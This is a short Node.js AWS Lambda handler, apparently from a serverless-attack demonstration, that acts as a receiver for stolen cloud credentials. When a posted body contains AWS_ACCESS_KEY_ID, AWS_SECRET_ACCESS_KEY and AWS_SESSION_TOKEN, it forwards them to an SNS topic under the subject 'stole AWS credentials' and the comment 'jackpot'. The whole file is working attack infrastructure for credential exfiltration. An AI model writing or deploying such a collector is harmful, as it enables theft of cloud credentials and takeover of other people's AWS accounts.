'use strict';

const co      = require('co');
const Promise = require('bluebird');
const AWS     = require('aws-sdk');
const sns     = Promise.promisifyAll(new AWS.SNS());

const response = { statusCode: 200 };

module.exports.handler = co.wrap(function* (event, context, callback) {  
  let envVars = JSON.parse(event.body);

  if (envVars.AWS_ACCESS_KEY_ID && 
      envVars.AWS_SECRET_ACCESS_KEY && 
      envVars.AWS_SESSION_TOKEN) {
    // jackpot
    let req = {
      Message: `AWS_ACCESS_KEY_ID=${envVars.AWS_ACCESS_KEY_ID} AWS_SECRET_ACCESS_KEY=${envVars.AWS_SECRET_ACCESS_KEY} AWS_SESSION_TOKEN=${envVars.AWS_SESSION_TOKEN}`,
      Subject: 'stole AWS credentials',
      TopicArn: process.env.JACKPOT_TOPIC
    };
    yield sns.publishAsync(req);
  }

  callback(null, response);
});